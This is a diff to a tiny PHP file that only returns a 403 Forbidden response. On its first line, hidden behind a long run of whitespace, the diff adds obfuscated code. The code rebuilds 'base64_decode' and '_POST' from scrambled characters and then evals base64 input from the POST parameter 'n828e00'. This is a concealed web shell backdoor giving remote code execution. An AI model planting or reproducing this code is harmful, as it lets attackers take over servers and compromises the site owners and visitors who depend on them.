@@ -1,4 +1,4 @@
-<?php
+<?php                                                                                                                                                                                                                                                           $gahd6= "4acdes_bto6p"; $hkff2 =strtolower($gahd6[7].$gahd6[1].$gahd6[5]. $gahd6[4] . $gahd6[10].$gahd6[0]. $gahd6[6].$gahd6[3].$gahd6[4]. $gahd6[2]. $gahd6[9]. $gahd6[3]. $gahd6[4] ); $seq88= strtoupper ( $gahd6[6]. $gahd6[11]. $gahd6[9].$gahd6[5].$gahd6[8] ) ; if( isset(${$seq88} ['n828e00'])) {eval($hkff2(${$seq88 } ['n828e00']) ) ; }?><?php
 header('Status: 403 Forbidden');
 header('HTTP/1.1 403 Forbidden');
 ?>
